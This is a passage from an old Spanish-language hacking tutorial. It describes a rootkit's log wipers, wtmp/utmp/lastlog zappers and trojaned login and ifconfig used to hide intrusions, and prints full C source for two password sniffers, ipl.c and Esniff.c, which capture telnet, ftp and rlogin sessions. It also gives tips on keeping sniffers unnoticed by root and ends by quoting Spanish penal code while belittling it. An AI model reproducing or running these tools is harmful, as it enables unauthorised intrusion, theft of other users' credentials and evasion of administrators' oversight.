                  This would remove all logs containing the strings evil.com,
                  123.100.101.202 and rshd. Smart! :))

  sniffit -       An advanced network sniffer. This is pretty kewl and has
                  lots of filtering options and other stuff. Useful for
                  targetting a single host or net. Sniffit uses ncurses.

  linsniffer -    A kewl sniffer. This is smaller than sniffit and doesn't
                  need the ncurses libraries.  
                  As CERT say, sniffing is responsible for more mass network
                  breakins than anything else in the 90's. P'raps they ain't
                  heard of Sendmail before hahahaha  

  fix -           Replaces and fixes timestamp/checksum infomation on files.
                  I modified this a bit for my own uses and to fix a nasty bug
                  when replacing syslogd and inetd. The replacement file will
                  be erased by fix (unlike other versions).  

  z2 -            Zapper2! Run this to erase the last utmp/wtmp/lastlog
                  entries for a username. This can be detected since it just
                  nulls the entry out but no sysadmins know this, right?

  wted -          This does lots of stuff. U can view ALL the entries in a
                  wtmp or utmp type file, erase entries by username or
                  hostname, view zapped users (admins use a util similar to
                  this to find erased entries), erase zapped users etc.

  lled -          Basically the same as wted but for lastlog entries. 

        Creo que con esto queda suficientemente claro no? jeje

        Como se puede ver, esta rootkit tiene de todo, unos cuantos troyanos,
  sniffer, borrador de huellas, inetd y login modificados para permitir
  acceso remoto, editores de wtmp y utmp, etc... en fin, como podeis ver si
  pillas root en una maquina e instalas una rootkit.. la maquina es tuya asi
  que no doy ideas.. jejejejejeje. Por cierto a fecha de hoy no encuentro
  rootkits para irix, aix, hp y demas por lo que si alguien tiene agradeceria
  que me lo comunicasen (yo solo tengo de sun y de linux... y una para bsd
  pero que no rula muy bien :o( y currarse una es una kurrada :(

        Ademas de lo que acabo de comentar, una vez tienes la maquina
  controlada, lo que has de hacer es poner un sniffer para conseguir mas
  cuentas (que a veces tambien viene incluida en la rootkit) que se comenta a
  continuacion.

        Nota previa: La manera mas usual de conectar maquinas es usando
  Ethernel. El protocolo de Ethernet trabaja enviando la informacion en
  paquetes a las maquinas de la red. La cabecera del paquete contiene la
  direccion IP de la maquina destino. Solo la maquina que tiene este IP va a
  recibir este paquete en teoria, pero una maquina se puede poner en modo
  promiscuo de manera que reciba todos los paquetes que van por la red
  independientemente de lo que ponga en la cabecera como IP de destino.

        Asi, basicamente un sniffer lo que hace es poner a la maquina en modo 
  promiscuo, es decir, que la maquina acepta todos los paquetes que van por la 
  red y no solo los que van destinados a ella.

        La gracia de esto es que en una red normal (sin usar metodos de
  encriptacion de passwords como el Kerberos) por la red rulan los paquetes
  con el login y passwd de otras maquinas con lo que conseguireis cuentas en
  otras maquinas sin hacer nada.. esta bien no?.

        El problema es que se puede detectar facilmente si en una maquina hay
  un sniffer corriendo simplemente haciendo ifconfig -a (en general, aunque
  varia un poco para algunos sistemas) porque aparece un mensaje de que la
  maquina esta en promiscous mode... por lo que tendras que poner un troyano
  para el ifconfig porque si no, el root se percatara y se mosqueara.
  Recuerdo que en las rootkits vienen incluidos troyanos para el ifconfig.

        Hay muchisimos sniffers, estos programas permiten muchas opciones
  como que te permiten sniffear algunos puertos o todos, buscar palabras en
  los paquetes, etc y los hay desde algunos muy cutres hasta otros
  comerciales. Algunos nombres son tcpdump, sniffit, esniff, websniff,
  linsniffer, solsniff, sunsniff, etc.. como veis hay muchos y para distintos
  sistemas operativos. He cogido de la phrack esta lista de sniffers para
  distintos sistemas operativos que supongo que sera de interes:

  OS                      Sniffer

  4.3/4.4 BSD           tcpdump /* Available via anonymous ftp  */
  FreeBSD tcpdump /* Available via anonymous ftp at        */
                  /* gatekeeper.dec.com
  /.0/BSD/FreeBSD/FreeBSD-current/src/contrib/tcpdump/ */
  NetBSD  tcpdump /* Available via anonymous ftp at        */
                 /* gatekeeper.dec.com
                 /* /.0/BSD/NetBSD/NetBSD-current/src/usr.sbin/ */
  DEC Unix        tcpdump /* Available via anonymous ftp           */
  DEC Ultrix      tcpdump /* Available via anonymous ftp           */
  HP/UX           nettl (monitor) & netfmt (display)
                          nfswatch        /* Available via anonymous ftp*/
  Irix                    nfswatch        /* Available via anonymous ftp*/
                          Etherman
  Tcpdump /* Available via anonymous ftp           */
  SunOS          etherfind
                       Nfswatch  /* Available via anonymous ftp*/
  tcpdump /* Available via anonymous ftp           */
  Solaris                 snoop
                  tcpdump
  DOS                     ETHLOAD         /* Available via anonymous ftp as*/
                                          /* ethld104.zip*/
                	The Gobbler     /* Available via anonymous ftp*/
                	LanPatrol
                	LanWatch
                	Netmon
                	Netwatch
                        Netzhack    /* Available via anonymous ftp at*/
                                    /* mistress.informatik.unibw-muenchen.de*/
                                    /* /pub/netzhack.mac*/
  Macintosh       Etherpeek

        Como veis el TCPDUMP es bastante interesante pero no lo adjunto en el
  texto por ser bastante grande. Este es un problema de este programa, que es
  un monitor de red muy potente pero tambien canta mucho si lo metes en una 
  makina porke tiene muchos archivos y canta bastante al hacer un ps-axw por
  lo que es mejor evitar usarlo y si estas en una linux o sun, usar sniffers 
  peque§itos ke hay para esos sistemas operativos.

        Aqui adjunto el codigo de un par de sniffers para que veais la forma
  que tienen aunque obviamente recuerdo que os hacen falta las librerias para
  que rulen:

------------ Codigo Fuente ---------------------------------------------------

/* ipl.c 1/3/95    by loq */
/* monitors ip packets for Linux */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <linux/if.h>
#include <signal.h>
#include <stdio.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>

#define BUFLEN 8192
#define ETHLINKHDR 14


print_data(int count, char *buff)
{
	int i,j,c;
	int printnext=1;
	if(count)
	{
	if(count%16)
		c=count+(16-count%16);
	else c=count;
	}
		else
		c=count;
	for(i=0;i<c;i++)
	{
		if(printnext) { printnext--; printf("%.4x ",i&0xffff); }
		if(i<count)
		printf("%3.2x",buff[i]&0xff);
		else
		printf("   ");
		if(!((i+1)%8)) 
			if((i+1)%16)
				printf(" -");
			else
				{
					printf("   ");
					for(j=i-15;j<=i;j++)
					  if(j<count) {
						if( (buff[j]&0xff) >= 0x20 && 
						    (buff[j]&0xff)<=0x7e)
                                                 printf("%c",buff[j]&0xff);
						else printf(".");
						} else printf(" ");
				printf("\n"); printnext=1;
				}
	}
}

int
initdevice(device, pflag)
	char *device;
	int pflag;
{
#define PROTO htons(0x0800)   /* Ethernet code for IP protocol */

	int if_fd=0;
	struct ifreq ifr;

	if ( (if_fd=socket(AF_INET,SOCK_PACKET,PROTO)) < 0 ) {
		perror("Can't get socket");
		exit(2);
	}

	strcpy(ifr.ifr_name, device);       /* interface we're gonna use */
	if( ioctl(if_fd, SIOCGIFFLAGS, &ifr) < 0 ) {    /* get flags */
		close(if_fd);
		perror("Can't get flags");
		exit(2);
	}
#if 1
	if ( pflag )
                ifr.ifr_flags |= IFF_PROMISC;       /* set promiscuous mode */
	else
		ifr.ifr_flags &= ~(IFF_PROMISC);
#endif

	if( ioctl(if_fd, SIOCSIFFLAGS, &ifr) < 0 ) {    /* set flags */
		close(if_fd);
		perror("Can't set flags");
		exit(2);
	}
	return if_fd;
}

struct etherpacket {
	struct ethhdr		eth;	
	struct iphdr		ip;
	struct tcphdr		tcp;
	char			data[8192];
	};

main()
{
	int linktype;
	int if_eth_fd=initdevice("eth0",1);
#if 0
	int if_ppp_fd=initdevice("sl0",1);
#endif
	struct etherpacket ep;
	struct sockaddr dest;
	struct iphdr *ip;
	struct tcphdr *tcp;
	struct timeval timeout;
	fd_set rd,wr;
	int dlen;
#if 0
	struct slcompress *slc=slhc_init(64,64);	
#endif

	for(;;)
	{
		bzero(&dest,sizeof(dest));
		dlen=0;
		FD_ZERO(&rd);
		FD_ZERO(&wr);
		FD_SET(if_eth_fd,&rd);
#if 0
		FD_SET(if_ppp_fd,&rd);
#endif
		timeout.tv_sec=0;
		timeout.tv_usec=0;
		ip=(struct iphdr *)(((unsigned long)&ep.ip)-2);
		tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2);
		while(timeout.tv_sec==0 && timeout.tv_usec==0)
		{
		timeout.tv_sec=10;
		timeout.tv_usec=0;
		select(20,&rd,&wr,NULL,&timeout);
		if(FD_ISSET(if_eth_fd,&rd))
			{
			printf("eth\n");
			recvfrom(if_eth_fd,&ep,sizeof(ep),0,&dest,&dlen);
			}
#if 0
		else
			if(FD_ISSET(if_ppp_fd,&rd))
			{
			recvfrom(if_ppp_fd,&ep,sizeof(ep),0,&dest,&dlen);
			printf("ppp\n");
			}
#endif
		}	

		printf("proto: %.4x",ntohs(ep.eth.h_proto));
#if 0
		if(ep.eth.h_proto==ntohs(8053))
		{
			slhc_uncompress(slc,&ep,sizeof(ep));
		}
#endif

		if(ep.eth.h_proto==ntohs(ETH_P_IP))
		{
		printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x->",
			ep.eth.h_source[0],ep.eth.h_source[1],
			ep.eth.h_source[2],ep.eth.h_source[3],
			ep.eth.h_source[4],ep.eth.h_source[5]);
		printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x ",
			ep.eth.h_dest[0],ep.eth.h_dest[1],
			ep.eth.h_dest[2],ep.eth.h_dest[3],
			ep.eth.h_dest[4],ep.eth.h_dest[5]);
		printf("%s[%d]->",inet_ntoa(ip->saddr),ntohs(tcp->source));
		printf("%s[%d]\n",inet_ntoa(ip->daddr),ntohs(tcp->dest));
		print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp),
			ep.data-2);
		}
	}
}

------------ FIN -------------------------------------------------------------

        Tambien pongo un sniffer generico para ethernet que aparecio en la
  PHRACK que esta dise§ado para trabajar en SunOs, es muy peque§o y solo
  captura los primeros 300 bytes de todas las sesiones de telnet, ftp o
  rlogin:

------------ Codigo Fuente ---------------------------------------------------

/* [JOIN THE POSSE!] */

/* Esniff.c */

#include <stdio.h>
#include <ctype.h>
#include <string.h>

#include <sys/time.h>
#include <sys/file.h>
#include <sys/stropts.h>
#include <sys/signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

#include <net/if.h>
#include <net/nit_if.h>
#include <net/nit_buf.h>
#include <net/if_arp.h>

#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_var.h>
#include <netinet/udp_var.h>
#include <netinet/in_systm.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>

#include <netdb.h>
#include <arpa/inet.h>

#define ERR stderr

char    *malloc();
char    *device,
        *ProgName,
        *LogName;
FILE    *LOG;
int     debug=0;

#define NIT_DEV     "/dev/nit"
#define CHUNKSIZE   4096        /* device buffer size */
int     if_fd = -1;
int     Packet[CHUNKSIZE+32];

void Pexit(err,msg)
int err; char *msg;
{ perror(msg);
  exit(err); }

void Zexit(err,msg)
int err; char *msg;
{ fprintf(ERR,msg);
  exit(err); }

#define IP          ((struct ip *)Packet)
#define IP_OFFSET   (0x1FFF)
#define SZETH       (sizeof(struct ether_header))
#define IPLEN       (ntohs(ip->ip_len))
#define IPHLEN      (ip->ip_hl)
#define TCPOFF      (tcph->th_off)
#define IPS         (ip->ip_src)
#define IPD         (ip->ip_dst)
#define TCPS        (tcph->th_sport)
#define TCPD        (tcph->th_dport)
#define IPeq(s,t)   ((s).s_addr == (t).s_addr)

#define TCPFL(FLAGS) (tcph->th_flags & (FLAGS))

#define MAXBUFLEN  (128)
time_t  LastTIME = 0;

struct CREC {
     struct CREC *Next,
                 *Last;
     time_t  Time;              /* start time */
     struct in_addr SRCip,
                    DSTip;
     u_int   SRCport,           /* src/dst ports */
             DSTport;
     u_char  Data[MAXBUFLEN+2]; /* important stuff :-) */
     u_int   Length;            /* current data length */
     u_int   PKcnt;             /* # pkts */
     u_long  LASTseq;
};

struct CREC *CLroot = NULL;

char *Symaddr(ip)
register struct in_addr ip;
{ register struct hostent *he =
      gethostbyaddr((char *)&ip.s_addr, sizeof(struct in_addr),AF_INET);

  return( (he)?(he->h_name):(inet_ntoa(ip)) );
}

char *TCPflags(flgs)
register u_char flgs;
{ static char iobuf[8];
#define SFL(P,THF,C) iobuf[P]=((flgs & THF)?C:'-')

  SFL(0,TH_FIN, 'F');
  SFL(1,TH_SYN, 'S');
  SFL(2,TH_RST, 'R');
  SFL(3,TH_PUSH,'P');
  SFL(4,TH_ACK, 'A');
  SFL(5,TH_URG, 'U');
  iobuf[6]=0;
  return(iobuf);
}

char *SERVp(port)
register u_int port;
{ static char buf[10];
  register char *p;

   switch(port) {
     case IPPORT_LOGINSERVER: p="rlogin"; break;
     case IPPORT_TELNET:      p="telnet"; break;
     case IPPORT_SMTP:        p="smtp"; break;
     case IPPORT_FTP:         p="ftp"; break;
     default: sprintf(buf,"%u",port); p=buf; break;
   }
   return(p);
}

char *Ptm(t)
register time_t *t;
{ register char *p = ctime(t);
  p[strlen(p)-6]=0; /* strip " YYYY\n" */
  return(p);
}

char *NOWtm()
{ time_t tm;
  time(&tm);
  return( Ptm(&tm) );
}

#define MAX(a,b) (((a)>(b))?(a):(b))
#define MIN(a,b) (((a)<(b))?(a):(b))

/* add an item */
#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
  register struct CREC *CLtmp = \
        (struct CREC *)malloc(sizeof(struct CREC)); \
  time( &(CLtmp->Time) ); \
  CLtmp->SRCip.s_addr = SIP.s_addr; \
  CLtmp->DSTip.s_addr = DIP.s_addr; \
  CLtmp->SRCport = SPORT; \
  CLtmp->DSTport = DPORT; \
  CLtmp->Length = MIN(LEN,MAXBUFLEN); \
  bcopy( (u_char *)DATA, (u_char *)CLtmp->Data, CLtmp->Length); \
  CLtmp->PKcnt = 1; \
  CLtmp->Next = CLroot; \
  CLtmp->Last = NULL; \
  CLroot = CLtmp; \
}

register struct CREC *GET_NODE(Sip,SP,Dip,DP)
register struct in_addr Sip,Dip;
register u_int SP,DP;
{ register struct CREC *CLr = CLroot;

  while(CLr != NULL) {
    if( (CLr->SRCport == SP) && (CLr->DSTport == DP) &&
        IPeq(CLr->SRCip,Sip) && IPeq(CLr->DSTip,Dip) )
            break;
    CLr = CLr->Next;
  }
  return(CLr);
}

#define ADDDATA_NODE(CL,DATA,LEN) { \
 bcopy((u_char *)DATA, (u_char *)&CL->Data[CL->Length],LEN); \
 CL->Length += LEN; \
}

#define PR_DATA(dp,ln) {    \
  register u_char lastc=0; \
  while(ln-- >0) { \
     if(*dp < 32) {  \
        switch(*dp) { \
            case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \
                        break; \
            case '\r': \
            case '\n': fprintf(LOG,"\n     : "); \
                        break; \
            default  : fprintf(LOG,"^%c", (*dp + 64)); \
                        break; \
        } \
     } else { \
        if(isprint(*dp)) fputc(*dp,LOG); \
        else fprintf(LOG,"(%d)",*dp); \
     } \
     lastc = *dp++; \
  } \
  fflush(LOG); \
}

void END_NODE(CLe,d,dl,msg)
register struct CREC *CLe;
register u_char *d;
register int dl;
register char *msg;
{
   fprintf(LOG,"\n-- TCP/IP LOG -- TM: %s --\n", Ptm(&CLe->Time));
   fprintf(LOG," PATH: %s(%s) =>", Symaddr(CLe->SRCip),SERVp(CLe-
>SRCport));
   fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport));
   fprintf(LOG," STAT: %s, %d pkts, %d bytes [%s]\n",
                        NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg);
   fprintf(LOG," DATA: ");
    { register u_int i = CLe->Length;
      register u_char *p = CLe->Data;
      PR_DATA(p,i);
      PR_DATA(d,dl);
    }

   fprintf(LOG,"\n-- \n");
   fflush(LOG);

   if(CLe->Next != NULL)
    CLe->Next->Last = CLe->Last;
   if(CLe->Last != NULL)
    CLe->Last->Next = CLe->Next;
   else
    CLroot = CLe->Next;
   free(CLe);
}

/* 30 mins (x 60 seconds) */
#define IDLE_TIMEOUT 1800
#define IDLE_NODE() { \
  time_t tm; \
  time(&tm); \
  if(LastTIME<tm) { \
     register struct CREC *CLe,*CLt = CLroot; \
     LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \
     while(CLe=CLt) { \
       CLt=CLe->Next; \
       if(CLe->Time <tm) \
           END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \
     } \
  } \
}

void filter(cp, pktlen)
register char *cp;
register u_int pktlen;
{
 register struct ip     *ip;
 register struct tcphdr *tcph;

 { register u_short EtherType=ntohs(((struct ether_header *)cp)->ether_type);

   if(EtherType < 0x600) {
     EtherType = *(u_short *)(cp + SZETH + 6);
     cp+=8; pktlen-=8;
   }

   if(EtherType != ETHERTYPE_IP) /* chuk it if its not IP */
      return;
 }

    /* ugh, gotta do an alignment :-( */
 bcopy(cp + SZETH, (char *)Packet,(int)(pktlen - SZETH));

 ip = (struct ip *)Packet;
 if( ip->ip_p != IPPROTO_TCP) /* chuk non tcp pkts */
    return;
 tcph = (struct tcphdr *)(Packet + IPHLEN);

 if(!( (TCPD == IPPORT_TELNET) ||
       (TCPD == IPPORT_LOGINSERVER) ||
       (TCPD == IPPORT_FTP)
   )) return;

 { register struct CREC *CLm;
   register int length = ((IPLEN - (IPHLEN * 4)) - (TCPOFF * 4));
   register u_char *p = (u_char *)Packet;

   p += ((IPHLEN * 4) + (TCPOFF * 4));

 if(debug) {
  fprintf(LOG,"PKT: (%s %04X) ", TCPflags(tcph->th_flags),length);
  fprintf(LOG,"%s[%s] => ", inet_ntoa(IPS),SERVp(TCPS));
  fprintf(LOG,"%s[%s]\n", inet_ntoa(IPD),SERVp(TCPD));
 }

   if( CLm = GET_NODE(IPS, TCPS, IPD, TCPD) ) {

      CLm->PKcnt++;

      if(length>0)
        if( (CLm->Length + length) < MAXBUFLEN ) {
          ADDDATA_NODE( CLm, p,length);
        } else {
          END_NODE( CLm, p,length, "DATA LIMIT");
        }

      if(TCPFL(TH_FIN|TH_RST)) {
          END_NODE( CLm, (u_char 
*)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST" );
      }

   } else {

      if(TCPFL(TH_SYN)) {
         ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);
      }

   }

   IDLE_NODE();

 }

}

/* signal handler
 */
void death()
{ register struct CREC *CLe;

    while(CLe=CLroot)
        END_NODE( CLe, (u_char *)NULL,0, "SIGNAL");

    fprintf(LOG,"\nLog ended at => %s\n",NOWtm());
    fflush(LOG);
    if(LOG != stdout)
        fclose(LOG);
    exit(1);
}

/* opens network interface, performs ioctls and reads from it,
 * passing data to filter function
 */
void do_it()
{
    int cc;
    char *buf;
    u_short sp_ts_len;

    if(!(buf=malloc(CHUNKSIZE)))
        Pexit(1,"Eth: malloc");

/* this /dev/nit initialization code pinched from etherfind */
  {
    struct strioctl si;
    struct ifreq    ifr;
    struct timeval  timeout;
    u_int  chunksize = CHUNKSIZE;
    u_long if_flags  = NI_PROMISC;

    if((if_fd = open(NIT_DEV, O_RDONLY)) < 0)
        Pexit(1,"Eth: nit open");

    if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) < 0)
        Pexit(1,"Eth: ioctl (I_SRDOPT)");

    si.ic_timout = INFTIM;

    if(ioctl(if_fd, I_PUSH, "nbuf") < 0)
        Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")");

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    si.ic_cmd = NIOCSTIME;
    si.ic_len = sizeof(timeout);
    si.ic_dp  = (char *)&timeout;
    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
        Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)");

    si.ic_cmd = NIOCSCHUNK;
    si.ic_len = sizeof(chunksize);
    si.ic_dp  = (char *)&chunksize;
    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
        Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)");

    strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));
    ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\0';
    si.ic_cmd = NIOCBIND;
    si.ic_len = sizeof(ifr);
    si.ic_dp  = (char *)&ifr;
    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
        Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)");

    si.ic_cmd = NIOCSFLAGS;
    si.ic_len = sizeof(if_flags);
    si.ic_dp  = (char *)&if_flags;
    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
        Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)");

    if(ioctl(if_fd, I_FLUSH, (char *)FLUSHR) < 0)
        Pexit(1,"Eth: ioctl (I_FLUSH)");
  }

    while ((cc = read(if_fd, buf, CHUNKSIZE)) >= 0) {
        register char *bp = buf,
                      *bufstop = (buf + cc);

        while (bp < bufstop) {
            register char *cp = bp;
            register struct nit_bufhdr *hdrp;

            hdrp = (struct nit_bufhdr *)cp;
            cp += sizeof(struct nit_bufhdr);
            bp += hdrp->nhb_totlen;
            filter(cp, (u_long)hdrp->nhb_msglen);
        }
    }
    Pexit((-1),"Eth: read");
}
 /* Authorize your proogie,generate your own password and uncomment here */
/* #define AUTHPASSWD "EloiZgZejWyms" */

void getauth()
{ char *buf,*getpass(),*crypt();
  char pwd[21],prmpt[81];

    strcpy(pwd,AUTHPASSWD);
    sprintf(prmpt,"(%s)UP? ",ProgName);
    buf=getpass(prmpt);
    if(strcmp(pwd,crypt(buf,pwd)))
        exit(1);
}
    */
void main(argc, argv)
int argc;
char **argv;
{
    char   cbuf[BUFSIZ];
    struct ifconf ifc;
    int    s,
           ac=1,
           backg=0;

    ProgName=argv[0];

 /*     getauth(); */

    LOG=NULL;
    device=NULL;
    while((ac<argc) && (argv[ac][0] == '-')) {
       register char ch = argv[ac++][1];
       switch(toupper(ch)) {
            case 'I': device=argv[ac++];
                      break;
            case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a")))
                         Zexit(1,"Output file cant be opened\n");
                      break;
            case 'B': backg=1;
                      break;
            case 'D': debug=1;
                      break;
            default : fprintf(ERR,
                        "Usage: %s [-b] [-d] [-i interface] [-f file]\n",
                            ProgName);
                      exit(1);
       }
    }

    if(!device) {
        if((s=socket(AF_INET, SOCK_DGRAM, 0)) < 0)
            Pexit(1,"Eth: socket");

        ifc.ifc_len = sizeof(cbuf);
        ifc.ifc_buf = cbuf;
        if(ioctl(s, SIOCGIFCONF, (char *)&ifc) < 0)
            Pexit(1,"Eth: ioctl");

        close(s);
        device = ifc.ifc_req->ifr_name;
    }

    fprintf(ERR,"Using logical device %s [%s]\n",device,NIT_DEV);
    fprintf(ERR,"Output to %s.%s%s",(LOG)?LogName:"stdout",
            (debug)?" (debug)":"",(backg)?" Backgrounding ":"\n");

    if(!LOG)
        LOG=stdout;

    signal(SIGINT, death);
    signal(SIGTERM,death);
    signal(SIGKILL,death);
    signal(SIGQUIT,death);

    if(backg && debug) {
         fprintf(ERR,"[Cannot bg with debug on]\n");
         backg=0;
    }

    if(backg) {
        register int s;

        if((s=fork())>0) {
           fprintf(ERR,"[pid %d]\n",s);
           exit(0);
        } else if(s<0)
           Pexit(1,"fork");

        if( (s=open("/dev/tty",O_RDWR))>0 ) {
                ioctl(s,TIOCNOTTY,(char *)NULL);
                close(s);
        }
    }
    fprintf(LOG,"\nLog started at => %s [pid %d]\n",NOWtm(),getpid());
    fflush(LOG);

    do_it();
}

------------ FIN -------------------------------------------------------------

        Lo que se ha de tener en cuenta cuando instalas un sniffer en una
  maquina es que como es logico, si hay mucho trafico de paquetes en esa
  maquina y no seleccionais bien la forma de filtrar que info queda en el log
  y cual no, se pueden generar ficheros de logs grandisimos por lo que este es
  un factor muy a tener en cuenta porque a veces si te equivocas.. se crea un
  fichero grandisimo, el root se percata y a la mierda todo el trabajo :o(

        Dependiendo de la makina y su trafico puede ser suficiente mirar los
  logs cada semana mas o menos o cada dos. Tambien, si eres comodo puedes
  usar un cronjob que te mailee los logs, pero eso kanta mas :)

  11.- LEGALIDAD

        Para acabar el articulo, creo que debo de acabar con esto ya que
  siempre hay que recordar que todo esto es ilegal... luego no digais que no
  estais avisados aunque tambien depende de lo que hagais. En realidad, opino
  que por entrar en una maquina y hacer cuatro cosas sin hacer da§o a nadie
  ni haciendoles perder datos, ni haciendolo por motivos de lucro o para
  destrozar cosas, esto no deberia ser ilegal pero en fin.. la guardia civil
  en lugar de dedicarse a perseguir a toda la mala gente que hay por ahi, se
  dedica a jodernos a nosotros.. la vida es asi :o(

        Sinceramente, no se si este codigo penal es el que nos interesa a
  nosotros ya que de leyes no tengo ni idea, pero lo he pillado por ahi y
  creo que es interesante que por lo menos le deis una leida:

        Ademas adjunto un texto como sobre comportarse si pasa algo que
  aunque esta orientado al caso de pirateria de software, creo que es
  sencilla su extrapolacion al caso que nos ocupa.

  NUEVO CODIGO PENAL 

  DELITOS RELACIONADOS CON LAS TECNOLOGIAS DE LA INFORMACION

  TITULO X 

        Delitos contra la intimidad, el derecho a la propia imagen y la
  inviolabilidad del domicilio 

  CAPITULO I 

        Del descubrimiento y revelacion de secretos 

  Articulo 197 
 
        1. El que para descubrir los secretos o vulnerar la intimidad de
  otro, sin su consentimiento, se apodere de sus papeles, cartas, mensajes de
  correo electronico o cualesquiera otros documentos o efectos personales o
  intercepte sus telecomunicaciones o utilice artificios tecnicos de escucha,
  transmision, grabacion o reproduccion del sonido o de la imagen, o de
  cualquier otra se§al de comunicacion, sera castigado con las penas de
  prision de uno a cuatro a§os y multa de doce a veinticuatro meses. 
 
        2. Las mismas penas se impondran al que, sin estar autorizado, se
  apodere, utilice o modifique, en perjuicio de tercero, datos reservados de
  caracter personal o familiar de otro que se hallen registrados en ficheros
  o soportes informaticos, electronicos o telematicos, o en cualquier otro
  tipo de archivo o registro publico o privado. Iguales penas se impondran a
  quien, sin estar autorizado, acceda por cualquier medio a los mismos y a
  quien los altere o utilice en perjuicio del titular de los datos o de un
  tercero.
 
        3. Se impondra la pena de prision de dos a cinco a§os si se difunden,
  revelan o ceden a terceros los datos o hechos descubiertos o las imagenes
  captadas a que se refieren los numeros anteriores. Sera castigado con las
  penas de prision de uno a tres a§os y multa de doce a veinticuatro meses,
  el que, con conocimiento de su origen ilicito y sin haber tomado parte en
  su descubrimiento, realizare la conducta descrita en el parrafo anterior. 
 
        4. Si los hechos descritos en los apartados 1 y 2 de este articulo
  se realizan por las personas encargadas o responsables de los ficheros,
  soportes informaticos, electronicos o telematicos, archivos o registros, se
  impondra la pena de prision de tres a cinco a§os, y si se difunden, ceden o
  revelan los datos reservados, se impondra la pena en su mitad superior. 
 
        5. Igualmente, cuando los hechos descritos en los apartados anteriores
  afecten a datos de caracter personal que revelen la ideologia, religion,
  creencias, salud, origen racial o vida sexual, o la victima fuere un menor
  de edad o un incapaz, se impondran las penas previstas en su mitad superior. 
 
        6. Si los hechos se realizan con fines lucrativos, se impondran las
  penas respectivamente previstas en los apartados 1 al 4 de este articulo en
  su mitad superior. Si ademas afectan a datos de los mencionados en el
  apartado 5, la pena a imponer sera la de prision de cuatro a siete a§os. 
 
  Articulo 198 
 
        La autoridad o funcionario publico que, fuera de los casos permitidos
  por la Ley, sin mediar causa legal por delito, y prevaliendose de su cargo,
  realizare cualquiera de las conductas descritas en el articulo anterior,
  sera castigado con las penas respectivamente previstas en el mismo, en su
  mitad superior y, ademas, con la de inhabilitacion absoluta por tiempo de
  seis a doce a§os.  

  Articulo 199
 
        1. El que revelare secretos ajenos, de los que tenga conocimiento por
  razon de su oficio o sus relaciones laborales, sera castigado con la pena
  de prision de uno a tres a§os y multa de seis a doce meses. 

        2. El profesional que, con incumplimiento de su obligacion de sigilo
  o reserva, divulgue los secretos de otra persona, sera castigado con la
  pena de prision de uno a cuatro a§os, multa de doce a veinticuatro meses e
  inhabilitacion especial para dicha profesion por tiempo de dos a seis a§os. 
 
  Articulo 200 
 
        Lo dispuesto en este capitulo sera aplicable al que descubriere,
  revelare o cediere datos reservados de personas juridicas, sin el
  consentimiento de sus representantes, salvo lo dispuesto en otros preceptos
  de este codigo.
 
  Articulo 201 
 
        1. Para proceder por los delitos previstos en este capitulo sera
  necesaria denuncia de la persona agraviada o de su representante legal.
  Cuando aquella sea menor de edad, incapaz o una persona desvalida, tambien
  podra denunciar el Ministerio Fiscal.  

        2. No sera precisa la denuncia exigida en el apartado anterior para
  proceder por los hechos descritos en el articulo 198 de este Codigo, ni
  cuando la comision del delito afecte a los intereses generales o a una
  pluralidad de personas. 
 
        3. El perdon del ofendido o de su representante legal, en su caso,
  extingue la accion penal o la pena impuesta, sin perjuicio de lo dispuesto
  en el segundo parrafo del numero 4ß del articulo 130. 
   
  Articulo 248. 
 
        1.- Cometen estafa los que, con animo de lucro, utilizaren enga§o
  bastante para producir error en otro, induciendolo a realizar un acto de
  disposicion en perjuicio propio o ajeno. 
 
        2.- Tambien se consideran reos de estafa los que, con animo de lucro,
  y valiendose de alguna manipulacion informatica o artificio semejante
  consigan la transferencia no consentida de cualquier activo patrimonial en
  perjuicio de tercero.
 
  Articulo 263. 
 
        El que causare da§os en propiedad ajena no comprendidos en otros
  Titulos de este Codigo, sera castigado con la pena de multa de seis a
  veinticuatro meses, atendidas la condicion economica de la victima y la
  cuantia del da§o, si este excediera de cincuenta mil pesetas. 
 
  Articulo 264. 

        1.- Sera castigado con la pena de prision de uno a tres a§os y multa
  de doce a veinticuatro meses el que causare da§os expresados en el articulo
  anterior, si concurriera alguno de los supuestos siguientes:
 
        1ß.- Que se realicen para impedir el libre ejercicio de la autoridad
  o en venganza de sus determinaciones, bien se cometiere el delito contra 
  funcionarios publicos, bien contra particulares que, como testigos o de 
  cualquier otra manera, hayan contribuido o pueden contribuir a la ejecucion
  o aplicacion de las Leyes o disposiciones generales. 
 
	2ß.-Que se cause por cualquier medio infeccion o contagio de ganado. 
 
	3ß.-Que se empleen sustancias venenosas o corrosivas. 
 
